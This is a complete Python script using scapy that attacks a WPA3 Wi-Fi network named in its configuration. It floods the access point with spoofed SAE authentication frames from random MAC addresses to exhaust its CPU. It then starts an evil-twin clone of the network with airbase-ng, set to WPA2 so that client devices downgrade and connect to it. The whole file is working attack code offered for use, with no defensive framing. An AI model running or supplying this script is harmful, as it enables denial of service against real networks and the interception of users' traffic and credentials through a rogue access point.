from scapy.all import *
import time
import os
import threading

# --- CONFIGURATION ---
IFACE = "wlan0mon"  # Your monitor mode interface
TARGET_SSID = "Home_WiFi"  # The SSID you want to clone/attack
target_info = {"bssid": None, "channel": None}

def scan_callback(pkt):
    """Scans for the target SSID to get its BSSID and Channel."""
    if pkt.haslayer(Dot11Beacon):
        ssid = pkt[Dot11Elt].info.decode(errors="ignore")
        if ssid == TARGET_SSID:
            target_info["bssid"] = pkt[Dot11].addr2
            target_info["channel"] = int(ord(pkt[Dot11Elt:3].info))
            return True

def sae_flood(target_bssid):
    """Floods the WPA3 AP with SAE Commit frames to exhaust its CPU."""
    print(f"[*] Launching SAE Flood against {target_bssid}...")
    while True:
        rand_mac = RandMAC()
        # Subtype 11 = Auth frame, Algo 3 = SAE
        pkt = RadioTap()/Dot11(addr1=target_bssid, addr2=rand_mac, addr3=target_bssid)/ \
              Dot11Auth(algo=3, seqnum=1, status=0)
        sendp(pkt, iface=IFACE, verbose=False)

# --- EXECUTION ---
print(f"[*] Scanning for {TARGET_SSID}...")
sniff(iface=IFACE, stop_filter=scan_callback, timeout=20)

if target_info["bssid"]:
    print(f"[+] Found! BSSID: {target_info['bssid']} | Channel: {target_info['channel']}")
    
    # 1. Start the SAE Flood in a background thread
    flood_thread = threading.Thread(target=sae_flood, args=(target_info["bssid"],))
    flood_thread.daemon = True
    flood_thread.start()

    # 2. Launch the Evil Twin (Clone) using airbase-ng
    # We use WPA2 (z2) to ensure the device can downgrade to it
    print(f"[*] Launching Evil Twin on Channel {target_info['channel']}...")
    os.system(f"airbase-ng -e '{TARGET_SSID}' -c {target_info['channel']} -z 2 {IFACE}")
else:
    print("[-] Target SSID not found.")
